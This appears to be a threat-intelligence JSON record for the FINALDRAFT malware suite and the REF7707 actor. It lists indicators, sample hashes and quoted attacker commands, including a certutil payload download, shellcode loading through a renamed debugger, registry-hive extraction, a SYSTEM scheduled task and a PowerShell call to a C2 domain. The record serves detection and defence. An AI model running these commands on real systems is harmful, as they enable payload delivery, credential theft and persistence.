@@ -1,0 +1,331 @@
+{
+  "malware_family": "FINALDRAFT",
+  "threat_actor": "REF7707",
+  "platforms": [
+    "windows",
+    "linux"
+  ],
+  "summary": "REF7707 is a campaign utilizing a novel malware suite including FINALDRAFT, GUIDLOADER, and PATHLOADER. The actor abuses legitimate cloud services like Microsoft Graph API for C2 and uses LOLBins like a renamed CDB.exe for execution and persistence. The malware has both Windows and Linux variants and has been observed targeting entities in South America and Southeast Asia.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "file_name",
+      "value": "fontdrvhost.exe",
+      "context": "Renamed version of the Windows-signed debugger CDB.exe.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\fontdrvhost.exe",
+      "context": "Location where certutil downloads the renamed CDB.exe.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\config.ini",
+      "context": "Weaponized INI file containing shellcode, used as script for CDB.exe.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\cCZtzzwy.exe",
+      "context": "Example file path for a PATHLOADER variant.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "certutil  -urlcache -split -f https://[redacted]/fontdrvhost.exe C:\\ProgramData\\fontdrvhost.exe",
+      "context": "Used for lateral movement to download tooling.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "C:\\ProgramData\\fontdrvhost.exe -cf C:\\ProgramData\\config.ini -o C:\\ProgramData\\fontdrvhost.exe",
+      "context": "Execution of renamed CDB.exe to load shellcode from config.ini.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "mspaint.exe",
+      "context": "Default process for shellcode injection by FINALDRAFT.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "conhost.exe",
+      "context": "Fallback process for shellcode injection by FINALDRAFT.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "Powershell Invoke-WebRequest -Uri \"https://support.vmphere.com\" -UseBasicParsing",
+      "context": "Connectivity check to C2 infrastructure.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "diskshadow.exe /s C:\\\\ProgramData\\\\SoftwareDistribution.txt",
+      "context": "Used to extract SAM, SECURITY, and SYSTEM registry hives.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "C:\\\\Windows\\\\system32\\\\net1 group /domain",
+      "context": "Domain enumeration command.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "reg query HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\UUID",
+      "context": "System enumeration command.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "scheduled_task",
+      "value": "\\Microsoft\\Windows\\AppID\\EPolicyManager",
+      "context": "Masquerading task name used for persistence.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "schtasks /create /RL HIGHEST /F /tn \"\\\\Microsoft\\\\Windows\\\\AppID\\\\EPolicyManager\" /tr \"C:\\\\ProgramData\\\\fontdrvhost.exe -cf C:\\\\ProgramData\\\\config.ini -o C:\\\\ProgramData\\\\fontdrvhost.exe\" /sc MINUTE /mo 1 /RU SYSTEM",
+      "context": "Command to create persistence scheduled task running every minute as SYSTEM.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "certificate_subject",
+      "value": "CloudFlare Origin Certificate",
+      "context": "Common Name for TLS certificates on actor-controlled C2 servers.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "poster.checkponit.com",
+      "context": "REF7707 infrastructure, used by GUIDLOADER and PATHLOADER.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "support.fortineat.com",
+      "context": "REF7707 infrastructure, hard-coded in PATHLOADER.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "update.hobiter.com",
+      "context": "REF7707 infrastructure, found in FINALDRAFT ELF variant.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "support.vmphere.com",
+      "context": "REF7707 infrastructure, found in FINALDRAFT ELF variant.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "cloud.autodiscovar.com",
+      "context": "REF7707 infrastructure, associated via infrastructure pivots.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "digert.ictnsc.com",
+      "context": "REF7707 infrastructure, used in connectivity checks.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "d-links.net",
+      "context": "REF7707 infrastructure, associated via infrastructure pivots.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "vm-clouds.net",
+      "context": "REF7707 infrastructure, associated via infrastructure pivots.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "47.83.8.198",
+      "context": "REF7707 infrastructure hosting hobiter.com.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "8.218.153.45",
+      "context": "REF7707 infrastructure hosting autodiscovar.com.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "45.91.133.254",
+      "context": "REF7707 infrastructure hosting vm-clouds.net.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "8.213.217.182",
+      "context": "REF7707 infrastructure hosting ictnsc.com.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "47.239.0.216",
+      "context": "REF7707 infrastructure hosting d-links.net.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "graph.microsoft.com",
+      "context": "Legitimate Microsoft service abused for C2 by FINALDRAFT.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "firebasestorage.googleapis.com",
+      "context": "Legitimate Google service used to host encrypted payloads.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "pastebin.com",
+      "context": "Legitimate service used to host encrypted payloads.",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "cffca467b6ff4dee8391c68650a53f4f3828a0b5a31a9aa501d2272b683205f9",
+      "description": "fontdrvhost.exe, a renamed version of CDB.exe."
+    },
+    {
+      "sha256": "6d79dfb00da88bb20770ffad636c884bad515def4f8e97e9a9d61473297617e3",
+      "description": "FINALDRAFT shellcode injected into memory."
+    },
+    {
+      "sha256": "08331f33d196ced23bb568689c950b39ff7734b7461d9501c404e2b1dc298cc1",
+      "description": "Unidentified binary inferred to be a PATHLOADER variant."
+    },
+    {
+      "sha256": "39e85de1b1121dc38a33eca97c41dbd9210124162c6d669d28480c833e059530",
+      "description": "Session.x64.dll, a FINALDRAFT sample."
+    },
+    {
+      "sha256": "83406905710e52f6af35b4b3c27549a12c28a628c492429d3a411fdb2d28cc8c",
+      "description": "pfman, a FINALDRAFT ELF variant."
+    },
+    {
+      "sha256": "f45661ea4959a944ca2917454d1314546cc0c88537479e00550eef05bed5b1b9",
+      "description": "biosets.rar, a FINALDRAFT ELF variant."
+    },
+    {
+      "sha256": "9a11d6fcf76583f7f70ff55297fb550fed774b61f35ee2edd95cf6f959853bcf",
+      "description": "dwn.exe, a PATHLOADER sample."
+    },
+    {
+      "sha256": "41a3a518cc8abad677bb2723e05e2f052509a6f33ea75f32bd6603c96b721081",
+      "description": "5.exe, a GUIDLOADER sample."
+    }
+  ],
+  "file_types": [
+    "pe",
+    "elf",
+    "archive"
+  ]
+}
